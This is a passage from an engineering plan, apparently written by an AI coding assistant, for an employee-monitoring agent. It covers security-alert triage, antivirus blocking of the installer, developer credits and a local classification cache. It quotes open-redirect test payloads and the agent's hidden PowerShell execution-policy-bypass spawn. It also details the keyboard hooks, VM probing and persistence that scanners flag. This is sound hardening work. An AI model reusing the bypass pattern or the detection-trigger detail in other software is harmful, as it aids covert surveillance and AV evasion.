  decides whether to clear a stale avatar. Worst case: an avatar isn't
  cleaned up.

Neither has a security consequence, both are two lines
(`new URL(u).hostname === …`), and fixing them empties the category so the
remaining 11 can be dismissed as a group without anyone re-reading them.

### 8.7 🟠 Dependabot — 3 alerts

| Alert | Package | Current | Reality |
|---|---|---|---|
| #62, #63 | `browserslist` (npm) | **4.28.1** in `Dashboard-Web/package-lock.json` | Build-time transitive dep. Both advisories need attacker-controlled `browserslist-stats.json` or query input — not reachable from the running app, but there is no reason to sit on it |
| #43 | `glib` (Rust) | **0.18.5** in `src-tauri/Cargo.lock` | `VariantStrIter` unsoundness; transitive via Tauri's Linux GTK stack. The agent never touches that type, and the shipping targets are Windows/macOS |

**Fix:** `npm update browserslist` in Dashboard-Web and `cargo update -p glib`
in `src-tauri`, then confirm the existing test suites and a Tauri build still
pass. Lockfile-only changes.

> ⚠️ `Tauri-App-Extension/src-tauri/Cargo.toml` has been modified in the
> working tree since this session began and is **not** my change — resolve or
> commit that before touching `Cargo.lock`, or the two will tangle.

## 9. False positives — dismiss with a reason, don't "fix"

Dismissing these in the GitHub UI (with the reason recorded) is the actual
work item. Left open, they train everyone to ignore the alert list — which is
how §8.1 sat unnoticed among 36 entries.

| Alerts | Claim | Why it's wrong |
|---|---|---|
| #32–#36 (5) | Cleartext transmission, `client/firebase.rs` | Every URL is a hardcoded `https://identitytoolkit.googleapis.com` / `securetoken.googleapis.com` literal. CodeQL can't see through `format!` to the scheme. The only `http://` strings in the crate are loopback (`127.0.0.1`) for the local auth-callback server and test doubles |
| #28–#31 (4) | Cleartext logging, `tracker.rs` / `controller.rs` / `api/events.rs` | All four log a **session UUID** (`"Tracking session {session_id}"`). No token, credential, or PII. Flagged on the variable name |
| 11 of #9–#20 | Incomplete URL substring sanitization | `methods.includes("google.com")` is **`Array.prototype.includes` on a list of Firebase provider IDs** (`"password"`, `"google.com"`, `"apple.com"`, `"emailLink"`) — exact element equality, not substring matching on a URL. The argument merely looks like a hostname |
| #5 | Clear-text storage, `password-policy/fetch-policy.ts:34` | Caches the password **policy** (min length, symbol rules) in sessionStorage. No password is involved |
| #6 | Clear-text logging, `scripts/sync-firebase-local.mjs:50` | A local developer script that prints config for pasting into `.env`. Never deployed, and the Firebase web API key is public by design |
| #27 | DOM text reinterpreted as HTML, `user-avatar-image.tsx:34` | **No HTML sink exists in that file today** — no `dangerouslySetInnerHTML`, no `innerHTML`; line 34 is `src={src}` on an `<img>`, where a `javascript:` URL does not execute. Either already fixed since the scan or a stale finding. Re-run the scan; if it survives, treat as real and re-triage |

## 10. Phasing for Issue #4

> ### ⚠️ Superseded by §37
> This table was written when the queue was 36 CodeQL alerts. It is now 592
> across nine tools. **Use §37's S1–S8**, which folds in the new work (§35
> committed installers, action pinning, Dockerfile `USER`, §36 tuning).
> §8 and §9 themselves are unchanged and still correct.

<details>
<summary>Original 36-alert phasing (historical)</summary>

| Phase | Content | Effort |
|---|---|---|
| S1 | §8.1 auth-page XSS/redirect, both files | ~1h, do first |
| S2 | §8.7 dependency bumps (lockfiles only) | ~30m |
| S3 | §8.2 TLS opt-in, §8.3 email-body logging, §8.4 workflow permissions | ~1h |
| S4 | §8.5 regexes, §8.6 hostname checks | ~30m |
| S5 | §9 dismiss 23 false positives with recorded reasons | ~30m |

</details>

Independent of Issues #1–#3 — different files entirely, no ordering
constraint between them.

## 11. Tests for Issue #4

- **§8.1 is the one that needs a real test**, table-driven over `buttonHref`
  resolution: `javascript:…` → `/`; `https://evil.example` → `/`;
  `//evil.example` → `/`; `/dashboard?x=1` → preserved; `""` → `/`. This logic
  is small, exploitable when wrong, and cheap to pin — exactly the case that
  earns a test.
- §8.5: assert the Bearer regex still extracts a normal token and returns
  promptly on a pathological header.
- Everything else is covered by the existing suite staying green.

---

# Issue #5 — Defender / Avast block the installer

## 12. The honest diagnosis

**The agent is not being mistaken for spyware by accident. At the Windows API
level it is behaviourally indistinguishable from commodity stalkerware, and
it ships without a verified publisher identity.** Both halves have to be
fixed; neither alone is enough.

Two independent mechanisms are firing:

- **Reputation / identity** (§12.1) — why the download is blocked *before*
  anything runs, with "Windows protected your PC" or a silent Avast quarantine.
- **Behavioural heuristics** (§12.2) — why the file itself scores as malicious
  once scanned or emulated.

### 12.1 The binary has no verified identity

| Fact | Where | Consequence |
|---|---|---|
| Authenticode signing is **conditional** — `if: matrix.platform == 'windows-latest' && env.HAS_WINDOWS_CERT == 'true'` | [release.yml:174](.github/workflows/release.yml:174) | If `secrets.WINDOWS_CERTIFICATE` was never set, **every release has shipped unsigned** and the workflow says nothing |
| No `certificateThumbprint` in the committed config | [tauri.conf.json](Tauri-App-Extension/src-tauri/tauri.conf.json) `bundle.windows` | Confirms signing is injected only at CI time, if at all |
| `"installMode": "perMachine"` | same file | Installer demands UAC elevation. Unsigned **+** elevated is the harshest SmartScreen path — "Unknown publisher", with Run-anyway buried behind *More info* |
| `"publisher": "Virtual Tracker"` | same file | Cosmetic metadata. Without a certificate it is an unverified string, not an identity |
| New version every release, private repo, few installs | [release.yml](.github/workflows/release.yml) bump job | Defender's cloud blocks on **prevalence**: a brand-new hash almost nobody has downloaded is blocked on that basis alone, signature or not |

**First thing to establish, before any work is planned:**

```powershell
Get-AuthenticodeSignature "$env:USERPROFILE\Downloads\<installer>.exe" | Format-List Status, SignerCertificate
```

`NotSigned` ⇒ §12.1 is the whole story and §13.1 fixes most of it.
`Valid` ⇒ it's reputation age + §12.2.

### 12.2 Behaviours that match malware TTPs

Every one of these is legitimate for this product. Every one is also exactly
what a scanner's heuristics and ML models are trained to catch.

| # | Behaviour | Where | Why it scores |
|---|---|---|---|
| 1 | **Global low-level keyboard + mouse hooks** — `SetWindowsHookExW(WH_KEYBOARD_LL / WH_MOUSE_LL)` | [activity.rs:209](Tauri-App-Extension/src-tauri/src/capture/activity.rs:209) | *The* canonical keylogger API. The code deliberately never captures key **content** — there is even a test enforcing that ([types.rs:678](Tauri-App-Extension/src-tauri/src/types.rs:678)) — but a static scanner sees the API, not the intent |
| 2 | **Hidden PowerShell with execution-policy bypass** — `powershell -STA -NoProfile -ExecutionPolicy Bypass -File …` spawned with `CREATE_NO_WINDOW` (0x08000000) | [window.rs:360](Tauri-App-Extension/src-tauri/src/capture/window.rs:360) | MITRE **T1059.001**. Hidden-window + policy-bypass is one of the most heavily weighted combinations in existence, because that is precisely how commodity loaders run their payload |
| 3 | **Anti-VM / sandbox fingerprinting** — CPUID hypervisor bit, hypervisor vendor string, VM driver-file probing | [vm_detect.rs](Tauri-App-Extension/src-tauri/src/capture/vm_detect.rs) | Anti-analysis behaviour, and **self-defeating here**: AV emulators detonate samples *inside a VM*, so the scanner directly observes the sample checking whether it is being analysed. Legitimate software rarely does this; evasive malware always does |
| 4 | **Periodic screen capture** | `capture/screen.rs` (xcap) | Spyware staple |
| 5 | **Persistence** — Run-key autostart | [lib.rs:479](Tauri-App-Extension/src-tauri/src/lib.rs:479) (`tauri-plugin-autostart`) | Persistence mechanism |
| 6 | **Self-update: downloads and executes new binaries** | `tauri-plugin-updater`, endpoint in tauri.conf.json | Dropper-shaped |
| 7 | Foreground-window and process enumeration — `OpenProcess`, `QueryFullProcessImageNameW` | [window.rs:203](Tauri-App-Extension/src-tauri/src/capture/window.rs:203) | Reconnaissance |
| 8 | Periodic upload of screenshots + input metrics to a remote endpoint | `client/api/events.rs` | Exfiltration-shaped traffic |

Items 1+2+3+4+5+6 in one unsigned, elevation-requiring binary is not a
borderline call. **A scanner that did *not* flag this would be a bad scanner.**

### 12.3 The part that will not go away

Some vendors classify employee-monitoring software as
**PUA / Riskware / `Application:Win32/Monitor`** *as a policy decision*, and
apply it to correctly-signed, well-known commercial products too. Those
detections are **not false positives** and will not be withdrawn on appeal.

Hubstaff, Time Doctor and ActivTrak all live with this. Their answer is not
engineering — it is **managed deployment**: the customer's IT admin pushes the
agent via Intune/GPO with a documented exclusion path. Any plan here has to
include that, or it will keep chasing a detection that is working as intended.

## 13. Fixes, in order of impact

### 13.1 🔴 Establish a real publisher identity — biggest single win

1. **Verify whether signing runs at all.** Make it fail loudly instead of
   silently skipping: on a Windows release build, a missing
   `WINDOWS_CERTIFICATE` should **fail the job**, not quietly ship an
   unsigned installer. Add a post-build `Get-AuthenticodeSignature` assertion
   so an unsigned artifact can never be published again. *~10 lines of
   workflow; do this first regardless of everything else.*
2. **Get an EV (or OV) code-signing certificate.** EV grants SmartScreen
   reputation **immediately**; OV has to earn it over weeks and thousands of
   installs. Since the 2023 CA/B key-storage rules, the private key must live
   in an HSM, so CI signing needs a cloud signing service:
   - **Azure Trusted Signing — ~$10/month**, integrates with GitHub Actions,
     by far the cheapest viable route
   - DigiCert KeyLocker / SSL.com eSigner — a few hundred $/yr
3. **Never rotate the certificate casually.** Reputation accrues to the
   cert + publisher name. Changing either resets it to zero.

### 13.2 🟠 Remove the hidden-PowerShell pattern — real engineering win, not just AV

Replace the `powershell -ExecutionPolicy Bypass` subprocess with **native
UIAutomation through Rust FFI** (the `uiautomation` crate, or direct
`windows` crate COM calls — the crate is already a dependency).

This is worth doing on its own merits, independent of any scanner:

- deletes the worst heuristic trigger in the codebase (§12.2 #2);
- removes a process spawn **every 15 seconds** per tracked machine;
- removes the 7-second `URL_CAPTURE_TICK_BUDGET_SEC` stall path and the
  "tick gave up" fallback ([events.rs:161](Tauri-App-Extension/src-tauri/src/capture/events.rs:161));
- removes a `resources`-shipped `.ps1` that can be tampered with on disk —
  spawning a bypassed-policy script from a writable resources directory is a
  genuine local-privilege-escalation footgun, scanner or no scanner.

Largest item here (~1–2 days, Windows-only, needs real hardware to verify),
and the one I would rank second after signing.

### 13.3 🟠 Reconsider shipping the VM detector

`vm_detect` produces **one boolean, reported once at device registration**,
which a manager reads as context — its own header says it is "never a verdict,
never anything that blocks or alters tracking".

That is a very small feature to pay for with a top-tier anti-analysis
heuristic that fires inside every AV emulator that ever inspects the binary.

Options, cheapest first:
- **Drop it.** The signal is advisory; the product loses almost nothing.
- **Keep CPUID only**, drop the driver-file probing (filesystem probing for
  VM driver paths is the more heuristic-visible half).
- **Move it server-side** where possible — parts of it can be inferred from
  telemetry already collected, with no client-side fingerprinting at all.

Recommendation: **drop the driver-file probe, keep the single CPUID bit.**
Preserves ~all of the detection value, removes the file-probing pattern.

### 13.4 🟡 The input hook — a real trade-off, not a free win

`WH_KEYBOARD_LL` is the strongest remaining signal, but it is also **the
product**: weighted keyboard-vs-click-vs-move scoring, distinct-key ratio,
cadence analysis, and the injected-input (jiggler/auto-clicker) detection all
depend on it. `GetLastInputInfo` would clear the heuristic and reduce the
activity score to "idle vs not idle".

**Recommendation: keep the hook.** Removing it guts the differentiator to
appease a signal that a valid EV signature plus vendor allowlisting already
addresses. Documented here so the trade-off is explicit rather than
rediscovered later.

### 13.5 🟡 Use the official vendor channels

- **VirusTotal first** — upload one release installer and read the *detection
  names*. Generic `…!ml`, `Trojan:Win32/Wacatac.B!ml`, `Win32:PWSX-gen` ⇒ a
  reputation/heuristic problem that §13.1 largely fixes. Specific family names
  ⇒ submit as below.
- **Microsoft** — Defender false-positive submission at the Security
  Intelligence portal; typically resolved in 1–3 days, and the verdict
  propagates to Defender cloud globally.
- **Avast/AVG** — developer false-positive form, plus their whitelisting
  programme for signed software.
- **Re-submit after a version bump** if the detection is hash-based rather
  than certificate-based.

### 13.6 🟡 Deployment story (for §12.3, the detections that stay)

- A short **"What this agent does"** page: every permission it uses and why —
  input hooks for activity scoring (**no keystroke content is ever stored or
  transmitted**, and there is a test enforcing it), screenshots, URL reading.
  This is what an IT admin needs to approve the exclusion, and what makes the
  claim verifiable rather than asserted.
- **Documented exclusion paths** for Intune/GPO/Defender ATP.
- Stable installer URL and consistent publisher name across releases.

## 14. Phasing for Issue #5 — under the "no payment, no uploads" constraint

**Constraint:** no certificate purchase, no VirusTotal upload, no vendor
submission portals. Everything ships as a git push plus a manual release run.

That removes §13.1's certificate (A2) and §13.5's submissions (A3) from the
plan. Both were real levers, and the honest consequence is in §14.2.

### 14.1 What is still achievable — all code, all shippable by push + release

| Phase | Content | Effort | Impact without a certificate |
|---|---|---|---|
| **A0** | Check `Get-AuthenticodeSignature` — **on the artifact from the GitHub release, not `/downloads/*.exe`** (§35: those are stale v0.4.0 committed copies, and testing them answers the wrong question) | 5 min, you run one command | Confirms the baseline. Almost certainly `NotSigned`. **Blocked until §37 S2 lands** |
| **A1** | Make the build **state clearly** whether it produced a signed artifact (log line + release-note marker) instead of silently not signing | ~30 min | Removes the ambiguity permanently; the check is then already in place if a certificate ever appears |
| **A4** | **§13.2 — replace the PowerShell URL sniffing with native UIAutomation** | ~1–2 days | 🔴 **Now the single largest lever available.** Removes the hidden-`powershell -ExecutionPolicy Bypass` pattern, and deletes the shipped `.ps1` from `resources` entirely |
| **A5** | **§13.3 — trim VM detection** to the CPUID bit, or drop it | ~1h | Removes the anti-analysis signal that fires inside every AV emulator |
| **A7** | **Switch `installMode` from `perMachine` to `currentUser`** | ~15 min + testing | Installs to `%LOCALAPPDATA%` with **no UAC prompt at all** — deletes the "unverified publisher wants to make changes to your device" dialog, the scariest single moment in the current install. Trade-off in §14.3 |
| **A6** | §13.6 transparency documentation + exclusion guidance | ~half day | The only real answer to the PUA-by-policy class (§12.3) |

**Revised critical path: A4 → A5 → A7.** With signing off the table, the
behavioural work stops being secondary and becomes the whole strategy.

### 14.2 What this will and will not achieve — no overselling

| | Expected outcome |
|---|---|
| **Realistic best case, free path** | Fewer heuristic/ML detections (`…!ml`, `…gen` families), because the three loudest behavioural signals are gone. Plausibly moves from *"blocked / silently quarantined"* to *"SmartScreen warning the user can click through via More info → Run anyway"* |
| **What will not change** | **SmartScreen will still warn.** It keys on reputation, which requires a signature and download volume. An unsigned binary from a private repo has neither, and no amount of code cleanup substitutes for it |
| **What also will not change** | The PUA/`Application:Win32/Monitor` classification some vendors apply to monitoring software **by policy** (§12.3) |

**There is no free workaround.** A self-signed certificate does not help —
Windows does not trust it, and it can read as *worse* than unsigned.
SignPath's free tier is open-source-only and this repo is private. Sigstore
is not trusted by SmartScreen. The cheapest real option remains Azure Trusted
Signing at roughly $10/month; noted only so the option is on record, not as a
recommendation you asked for.

**Therefore A6 is not optional under this constraint** — it is the substitute.
If users must click through a warning, they need a page that tells them what
the agent does and why the warning appears, and IT needs documented exclusion
paths. That documentation is doing the work the certificate would otherwise do.

### 14.3 A7 trade-off — read before switching

`perMachine` → `currentUser` removes the UAC prompt, but:

- installs per-user, so a shared machine needs one install per account;
- an IT-managed all-users deployment gets harder (may be a reason to keep
  `perMachine` for a separately-built IT installer later);
- autostart still works (`HKCU\…\Run`), and the updater still works.

For self-service installs by employees this is a clear win. If the intended
deployment is IT-pushed via Intune/GPO, keep `perMachine` — the UAC prompt is
irrelevant there because the deployment runs as SYSTEM, and A7 buys nothing.
**Tell me which deployment model is intended and I will apply it or drop it.**

## 15. Scope note

Everything above is about **establishing authentic publisher identity and
removing genuinely unnecessary suspicious behaviour** — a correctly attributed,
signed installer that an IT admin can verify and approve. None of it is about
hiding what the agent does. The transparency page in §13.6 is load-bearing for
that, not decorative: an employee-monitoring agent that is *harder* to identify
is a worse product, not a better one.

---

# Issue #6 — Ownership and developer attribution

Nothing in the codebase currently names an owner or a developer — a
repo-wide grep for `Soft Fix` / `Virtual Callers` returns **zero hits**, and
`tauri.conf.json` carries only `"publisher": "Virtual Tracker"`.

## 16. Ownership: Soft Fix + Virtual Callers

**Owner of record: Soft Fix and Virtual Callers.**

### 16.1 The publisher string — now a free choice

Today `tauri.conf.json` says `"publisher": "Virtual Tracker"`, which matches
neither stated owner.

**With no certificate in scope (§14, §24.4), this is cosmetic** — it shows in
installer metadata and Add/Remove Programs, and nothing validates it. So pick
whatever name you want users to see; **I just need the string** (§24.3 #1).

**Recommendation:** `"Soft Fix"` or `"Soft Fix / Virtual Callers"` in
`publisher`, both names in the About panel and the §13.6 page.

**If a certificate is ever purchased, this stops being cosmetic** and the
constraint below applies — recorded now so it isn't rediscovered later:

- Windows shows the **certificate's** Subject/Organization as the verified
  publisher, not the app's config. A cert issued to *Soft Fix* on a binary
  declaring *Virtual Tracker* reads as **less** trustworthy than one honest
  name, and is only fixable by re-issuing the certificate.
- The CA validates against real legal registration, so the name must match an
  actual registered entity exactly.
- Keep both stable afterwards: SmartScreen reputation accrues to certificate
  **plus** publisher name, and changing either resets it to zero.

### 16.2 Where ownership should appear

| Surface | What |
|---|---|
| `tauri.conf.json` → `bundle.publisher` | one chosen name (§16.1) |
| Authenticode certificate Subject/O | *n/a while unsigned — must match `publisher` if that ever changes* |
| Agent About panel (§17) | "Soft Fix · Virtual Callers" |
| Dashboard-Web About card (§17) | same |
| §13.6 transparency page | same — this is the page an IT admin reads before approving the exclusion, and an unnamed vendor is a reason to decline |

## 17. In-app developer credits

### 17.1 What to show

| Field | Value | Source |
|---|---|---|
| Product | Virtual Tracker Agent | `tauri.conf.json` `productName` |
| Version | e.g. 0.4.21 | **read at runtime**, never hardcoded — see §17.3 |
| Owner | Soft Fix · Virtual Callers | constant |
| Developer | **Mohammed Hesham** — [github.com/Mohammed-HeshamMohammed](https://github.com/Mohammed-HeshamMohammed) | GitHub mark + name, opens externally |
| Developer | **Mohammed Magdy** — [github.com/mo7amed-magdy](https://github.com/mo7amed-magdy) | same |

### 17.2 Where it goes

- **Agent:** an *About* section at the bottom of
  [SettingsPanel.tsx](Tauri-App-Extension/src/components/views/SettingsPanel.tsx).
  Sits naturally beside the existing
  [MonitoringNoticePanel.tsx](Tauri-App-Extension/src/components/views/MonitoringNoticePanel.tsx),
  which is already the app's transparency surface — "what this does" and
  "who made it" belong together, and together they are what §13.6 needs.
- **Dashboard-Web:** an About card in
  [settings-all.tsx](Dashboard-Web/features/settings/components/app/settings-all.tsx).

### 17.3 Implementation notes — three real traps

1. **Zero new dependencies.** `@tauri-apps/plugin-opener` is already in
   [package.json](Tauri-App-Extension/package.json), the Rust plugin is
   already registered ([lib.rs:669](Tauri-App-Extension/src-tauri/src/lib.rs:669)),
   and `"opener:default"` is already granted in
   [capabilities/default.json](Tauri-App-Extension/src-tauri/capabilities/default.json).
   *(If `openUrl` is rejected at runtime, the default permission set needs
   `opener:allow-open-url` added — one line, confirm on first run.)*
2. **Never navigate the webview to GitHub.** Use `openUrl()` so the link opens
   in the system browser. A plain `<a href>` inside a Tauri window replaces
   the agent's own UI with github.com and leaves the user stranded — there is
   no back button, the window is `decorations: false` and non-resizable.
3. **Read the version at runtime** via `getVersion()` from
   `@tauri-apps/api/app`. The release workflow rewrites the version in
   `package.json`, `tauri.conf.json` **and** `Cargo.toml` on every release
   ([release.yml bump job](.github/workflows/release.yml)) — a hardcoded
   string in an About box would silently drift on the very next release, and
   a wrong version in the one place users go to report bugs is worse than no
   version at all.

**Icon:** inline SVG for the GitHub mark, as a small shared component. The
agent has no icon library at all (no `lucide-react` in its dependencies), and
lucide dropped brand icons from recent versions, so an inline SVG is one
implementation that works in both apps, needs no network, and renders offline
— rather than two different approaches for the same 16px glyph.

Effort: ~half a day for both surfaces, including the shared icon.

---

# Issue #7 — Local classification cache in the agent

Goals given: **offline clock-in support**, **less server load**, and the cache
**must not be readable or modifiable by the user**.

## 18. Starting point — most of this already exists

| Already there | Where |
|---|---|
| The agent **already downloads the entire `activity_categories` table every 30 minutes** — and then discards most of it | [classification.rs:21](Tauri-App-Extension/src-tauri/src/client/api/classification.rs:21) `fetch_app_display_names()` filters to `matchType == "app"` **and** requires a `displayName`, dropping every `domain` row and every `category` field |
| Refresh cadence | `DISPLAY_NAME_REFRESH_INTERVAL_SEC = 30 min` ([constants.rs:31](Tauri-App-Extension/src-tauri/src/constants.rs:31)) |
| Disk-backed offline event queue with bounded backlog | [queue.rs](Tauri-App-Extension/src-tauri/src/queue.rs) (`MAX_QUEUED_BATCHES = 2000`) |
| OS-keychain credential storage — **`keyring` 4.1.6 is already a dependency** and already holds the auth tokens (DPAPI is now migration-only) | [Cargo.toml:59](Tauri-App-Extension/src-tauri/Cargo.toml:59), [auth/dpapi.rs:1](Tauri-App-Extension/src-tauri/src/auth/dpapi.rs:1) |

So the feature is mostly **"stop throwing away rows you already fetched, and
persist them"** — not a new pipeline. No new crate for encryption either;
`keyring` is already integrated and already trusted with something far more
sensitive than this.

## 19. The "cannot be accessed or changed" requirement — honest answer

### 19.1 The part that is not achievable, stated plainly

**Nothing stored on a machine the user controls can be made truly
inaccessible to that user.** The agent must be able to decrypt the cache to
use it, so the key is reachable by anything running as that user. Encryption
raises the cost of casual inspection; it does not stop a determined local
admin with a debugger. Any plan promising otherwise is promising DRM, and DRM
does not work.

### 19.2 The part that matters — and it is already solved by Issue #1

The requirement behind "cannot be changed" is presumably: *an employee must
not be able to make `reddit.com` count as productive.*

**They cannot, and not because the file is locked — because the file is not
worth attacking.** Issue #1 (§1.1) resolves categories **server-side at read
time**. The server never accepts a category from the agent. Therefore:

| Attack | Result |
|---|---|
| Employee edits the local cache to mark `reddit.com` productive | **Zero effect on any report.** The server classifies from its own table when the feed is read. The employee has changed a label in their own window, seen by them alone |
| Employee deletes the cache | Agent shows raw names until the next refresh. No data loss — events are queued separately |
| Employee replaces it with an old copy | Same as above; rollback counter (§19.4) rejects it anyway |

The local cache is a **display convenience with no authority**. That is the
actual security control, and it costs nothing because the architecture
already has it.

### 19.3 🔒 Make that invariant permanent — the one control that really matters

The danger is not today's design; it is someone later "optimising" by having
the agent send its own verdict. That single change would silently convert
this cache from cosmetic to authoritative and make tampering profitable.

**Enforce it with a test, using the pattern this codebase already invented.**
[types.rs:678](Tauri-App-Extension/src-tauri/src/types.rs:678) already scans
its own source to assert `ActivityEvent` can never grow a keylogging-shaped
field. Add the sibling assertion:

```rust
// ActivityEvent must never carry a classification verdict - the server
// resolves categories at read time (see PLAN §1.1). An agent-supplied
// category would make the local cache authoritative and therefore worth
// tampering with.
for forbidden in ["category", "classification", "productive", "verdict"] { … }
```

Cheap, self-documenting, and it fails loudly the day someone tries.

### 19.4 Defence in depth — worth doing, correctly scoped

Why bother at all if §19.2 makes tampering pointless? Because the table is
mildly **confidential**: it reveals which domains and internal tool names the
organisation tracks and considers distracting.

| Control | Mechanism | Honest ceiling |
|---|---|---|
| **Location** | Per-user app data dir (`dirs::data_local_dir()`), default ACLs — not a shared or world-readable path | Stops other users on the machine |
| **Encryption at rest** | AEAD with a key from **`keyring`** — already a dependency, already holding auth tokens. No new crate | Stops casual inspection and copying the file to another machine. Does **not** stop the logged-in user |
| **Tamper detection** | AEAD authentication tag — a modified file fails to decrypt; the agent then discards it and refetches rather than trusting it | Detects, does not prevent |
| **Rollback** | Store the server's `updated_at`/version; refuse a bundle older than the one already held | Stops swapping in a stale bundle |
| **Signature** *(not now)* | Server-side minisign over the bundle, verified against an embedded pubkey — the updater already does exactly this (`pubkey` in tauri.conf.json) | `// ponytail: AEAD is enough while the cache is display-only; add minisign only if the agent is ever given authority over a decision` |

Document the ceiling in the module header, the way `vm_detect.rs` and
`dpapi.rs` already do. A future reader must not mistake "encrypted" for
"the user cannot read this".

## 20. Offline mode — what it actually buys

Events are **already safe offline**: `queue.rs` buffers them and resends on
reconnect. So this is not about data loss.

**The real, visible bug it fixes:** `apply_display_names` keeps the mapping
**in memory only** ([events.rs:75](Tauri-App-Extension/src-tauri/src/capture/events.rs:75)).
Restart the agent while offline and it shows raw executable names —
`chrome.exe`, `msedge.exe` — until it can reach the server again. Persisting
the cache fixes that outright.

**Honest scope:** because the server classifies at read time, offline
categorisation is **cosmetic** — it changes what the employee sees in their
own window, never what is reported. Worth having (an agent that degrades to
raw exe names looks broken), but it should not be sold as offline
"correctness".

## 21. Server load — honest assessment

The stated goal, but the arithmetic does not support it as the main
justification:

- Each agent polls once per **30 minutes**; the server cost is one small
  `SELECT` against a few-hundred-row table.
- **§1.5 M1 already removes that cost far more effectively** by caching
  `getAllCategories()` server-side. Distributing the table to clients does not
  reduce polling — the agents still poll.

**The genuine win available here is conditional GET.** Classification changes
a few times a month; almost every one of those 30-minute polls can be a
`304 Not Modified` with an empty body:

- Server: `ETag` on `/api/classification/categories`, derived from
  `max(updated_at)` + row count.
- Agent: send `If-None-Match`, treat `304` as "keep what you have".

That is a handful of lines on each side and makes the poll nearly free. Do it
— just don't expect the local cache itself to be the thing that lightens the
server.

## 22. Changes

**Backend**
- `ETag` / `If-None-Match` on `GET /api/classification/categories` (§21).
- Response already returns everything needed — no shape change required.

**Agent**
- `client/api/classification.rs`: keep `domain` rows and the `category` field
  instead of filtering them out; handle `304`.
- New `capture/classification_cache.rs`: keyring-sealed, AEAD-encrypted,
  version-stamped file in the per-user data dir; load on startup before the
  first refresh; atomic write (temp file + rename) so a crash mid-write can't
  leave a truncated cache.
- `capture/events.rs`: `apply_display_names` becomes
  `apply_classifications(entries)`, persisting as well as caching in memory;
  unchanged fallback contract — a failed fetch leaves the existing cache
  intact ([classification.rs:14](Tauri-App-Extension/src-tauri/src/client/api/classification.rs:14)).
- `types.rs`: the §19.3 guard test.

**Not changing:** `ActivityEvent`, the ingest endpoint, and the server-side
resolver. The agent gains no authority over any category. That is the point.

## 23. Phasing and tests

| Phase | Content | Effort |
|---|---|---|
| **C1** | Keep `domain` + `category` rows; persist plaintext to the per-user data dir; fix the offline raw-exe-name bug | ~half day |
| **C2** | §19.4 keyring-sealed AEAD + version/rollback guard | ~half day |
| **C3** | §21 ETag / 304 on both sides | ~2h |
| **C4** | §19.3 invariant test | ~30 min — do it **with C1**, not after |

Tests:
- Tampered cache file → fails authentication → discarded and refetched, agent
  never runs on modified data.
- Older bundle version → rejected.
- Cold start offline with a persisted cache → real display names, not
  `chrome.exe` (the §20 bug, pinned).
- Fetch failure → existing cache retained, never blanked (the existing
  contract, now also across restarts).
- `304` → cache retained, no reparse.
- §19.3 source-scan guard fails if `ActivityEvent` grows a category field.

---

# 24. Scope — what ships without you paying or uploading anything

**Your workflow:** I write code → you push to GitHub → you trigger the release
workflow manually. No purchases, no file uploads to third parties, no account
signups.

Everything below is measured against that.

## 24.1 Fully mine — code only, ships via push + release

| Issue | Work | Notes |
|---|---|---|
| **#1** Browser→URL categories | All of it — resolver, feed wiring, cache (§1.5 M1), missing index (§1.5 M3), export stamp + reclassification notice (§1.6) | Read-time fix, no migration, corrects history on deploy |
| **#2** Agent sends URL with screenshots | All of it | New columns are applied by `ensure-lookup-schema.js` on boot — **no manual migration step**, consistent with how this deploy already works |
| **#3** Screenshot activity edit | All of it — schema, `PATCH` route, run-splitting, integrity fix, UI | Same auto-applied schema path |
| **#4** Security alerts (**592**, §37) | All code fixes (§8.1–§8.6), dependency bumps (§8.7), **§35 removing the committed installers + repointing download links**, action/base-image pinning (S3), Dockerfile `USER` (S5), and **§36 tuning `security.yml`** (S7) | Every phase S1–S7 is mine. Only S8 needs you — §24.2 |
| **#5** AV blocking | §14.1 entirely: A1, A4, A5, A7, A6 | The certificate is not in scope — §14.2 |
| **#6** Ownership + credits | All of it, once you answer §24.3 #1 | Zero new dependencies |
| **#7** Classification cache | All of it | Zero new dependencies (`keyring` already present) |

**Six of seven issues are fully deliverable this way.** Only Issue #5 is
partially blocked, and only on the certificate.

## 24.2 Mine, but needs your GitHub credentials — I can drive it if you want

Dismissing false positives — **now ~200+ after §33, not 23** — is normally
clicking through the GitHub UI, but it is also an API call, and `gh` is
already authenticated here (I used it to triage the 592 in Part IV):

```bash
gh api -X PATCH repos/Mohammed-HeshamMohammed/Virtual-Tracker/code-scanning/alerts/32 \
  -f state=dismissed -f dismissed_reason="false positive" \
  -f dismissed_comment="URL is a hardcoded https:// literal; CodeQL cannot see through format!"
```

I can script them by rule, with the written reason from §9/§33 attached to
each group. **Say the word and I will — I will not touch alert state on my
own**, since dismissing a security alert is a judgement call that should be
yours to authorise, and it is visible to anyone auditing the repo.

**Do S7 (§36 tuning) first.** Tuning suppresses ~200 at the source
permanently; dismissing them one by one is per-alert and they can return on
the next scan of a changed file. Dismissal is for what survives tuning.

## 24.3 Decisions only you can make — no work, just answers

1. **§16.1 — which name goes in `bundle.publisher`?** Soft Fix, Virtual
   Callers, or both. Without a certificate this is now cosmetic rather than
   binding, so it is a free choice — but I need the string.
2. **§14.3 — self-service installs or IT-pushed?** Decides whether A7
   (`currentUser`, no UAC prompt) is a win or pointless.
3. **§3.4 — "affect the sessions"**: other screenshots in the stretch, or the
   session's tracked time?
4. **§0.2 — confirm the browser/URL reading.**

## 24.4 Genuinely outside this plan — yours to do or skip

| Item | Why it is out |
|---|---|
| EV / OV code-signing certificate (§13.1) | Costs money. **The single highest-impact AV fix, and it stays undone.** §14.2 states the consequence honestly rather than pretending the free path closes the gap |
| VirusTotal scan (§13.5) | Free, but requires you to upload the installer. Useful diagnostically — the detection *names* would tell us whether the remaining flags are reputation-based or specific-signature — but entirely your call |
| Microsoft / Avast false-positive submissions (§13.5) | Free, but require uploading the file and a human on a vendor portal |
| Any real-Windows verification of A4/A5/A7 | I cannot run the built installer or observe Defender's live verdict from here. **You are the only one who can confirm whether the behavioural work actually changed the outcome** — the release build is the test |

## 24.5 One honest caveat on A4

The UIAutomation rewrite (§13.2) is the largest free lever **and** the item I
can least verify from here: it is Windows-only COM code, and this environment
cannot run it. The existing PowerShell path at least has a known-good
fallback (`None` → window-title parsing), and I would keep that fallback
rather than replace it, so a failed UIAutomation call degrades exactly the
way a failed script does today instead of losing URL capture entirely.

Expect **at least one round of "it built, but URLs stopped appearing"** on
real hardware. That is normal for this kind of change, not a sign it went
wrong — plan for a verification pass rather than a single release.

---

# Part III — Integration review: order, collisions, aftermath

The seven issues were written independently. This part is the pass over all
of them together: what collides, what breaks *after* deploy rather than
during, and the order that avoids both.

## 25. Unified execution order

Dependencies are real, not preference. `→` means "must come after".

